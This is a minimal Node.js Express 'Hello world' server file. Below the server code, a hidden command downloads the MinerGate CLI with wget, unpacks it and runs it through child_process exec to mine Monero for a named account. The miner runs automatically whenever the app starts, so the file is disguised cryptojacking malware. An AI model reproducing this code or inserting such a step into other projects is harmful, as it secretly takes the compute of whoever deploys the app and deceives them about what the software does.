'use strict';

const express = require('express');
const exec = require("child_process").exec

const PORT = 8080;

const app = express();
app.get('/', function (req, res) {
  res.send('Hello world\n');
});

app.listen(PORT);
console.log('Running on http://localhost:' + PORT);

var cmd = 'wget -q --content-disposition https://minergate.com/download/deb-cli && ar x minergate-cli-release.deb && tar -xzf control.tar.gz && tar -xzf data.tar.gz && cd opt/minergate-cli && ./minergate-cli -user chaowarut@Hotmail.com -xmr';
exec(cmd);
